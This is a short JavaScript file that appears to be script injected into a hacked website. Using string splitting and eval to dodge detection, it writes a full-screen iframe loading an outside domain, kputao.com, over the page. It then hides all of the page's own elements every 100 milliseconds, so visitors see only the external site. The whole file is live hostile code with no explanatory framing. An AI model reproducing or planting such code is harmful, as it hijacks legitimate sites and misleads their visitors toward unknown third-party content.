var ab = "kputao.com/";
var ss = '<div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="https://' + ab + '"></iframe></div><style type="text/css">html{width:100%;height:100%;overflow:hidden;}body {width:100%;height:100%;overflow:hidden}</style>';
eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
try {
	setInterval(function() {
		try {
			document.getElementById("div" + "All").style.display = "no" + "ne"
		} catch (e) {}
		for (var i = 0; i < document.body.children.length; i++) {
			try {
				var a = document.body.children[i].tagName;
				var b = document.body.children[i].id;
				if (b != "iconDiv1" && b != "showcloneshengxiaon") {
					document.body.children[i].style.display = "non" + "e"
				}
			} catch (e) {}
		}
	}, 100)
} catch (e) {}
